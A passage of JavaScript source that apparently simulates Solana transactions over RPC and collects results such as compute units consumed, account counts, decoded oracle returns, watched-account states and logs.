            replaceRecentBlockhash: true, commitment: 'confirmed', innerInstructions: true,
            ...(includeWatchedAccounts ? {accounts: {encoding: 'base64',
              addresses: watch.map(x => x[1].toBase58())}} : {})},
        ]})});
      const json = await response.json();
      const value = json.result?.value;
      return {label, slot: json.result?.context?.slot, err: value?.err || null,
        rpcError: json.error || null, v1Bytes: encoded.sizeBytes, v0Bytes: encoded.v0Bytes,
        accountCount: encoded.addressCount, writableCount: encoded.writableCount,
        instructionCount: encoded.instructionCount, requiredSignatures: encoded.requiredSignatures,
        unitsConsumed: value?.unitsConsumed, loadedAccountsDataSize: value?.loadedAccountsDataSize,
        oracleReturns: decodeOracleReturns(value?.logs),
        post: includeWatchedAccounts ? decodeAccounts(value?.accounts) : null,
        logs: value?.logs || null};
    } catch (error) {
      return {label, localError: error.stack, oracleReturns: [], post: null};
    }
  }
}

main().catch(error => { console.error(error.stack); process.exitCode = 1; });
